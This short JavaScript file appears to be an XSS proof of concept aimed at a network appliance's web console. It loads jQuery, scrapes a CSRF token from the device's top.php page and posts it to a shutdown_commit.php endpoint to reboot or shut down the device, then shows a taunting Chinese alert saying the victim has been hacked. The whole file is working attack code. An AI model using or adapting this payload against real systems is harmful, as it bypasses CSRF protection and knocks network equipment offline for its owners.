function loadScript(url){
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.src = url;
    var html = document.documentElement;
    html.insertBefore(script, html.firstChild);
    alert("xss2");
}
loadScript("https://libs.baidu.com/jquery/2.0.0/jquery.min.js");
$.get("https://192.168.4.251:9090/top.php", function(data){
            vdata = data;
            var token = $(vdata).find("input[name=tokenid]")[0].value;
            $.post('https://192.168.4.251:9090/view/systemConfig/reboot/shutdown_commit.php',
                {
                    tokenid: token,
                    operation: 'on',
                    rebootmode: '1',
                    servicename: '',
                    cfgsave: 'save'
                },
                function(data, status){
                    console.log('Data: ' + data + '\nStatus: ' + status);
                    alert("你已经被黑了，看看你的设备还好么？")；
                }
            );

    })
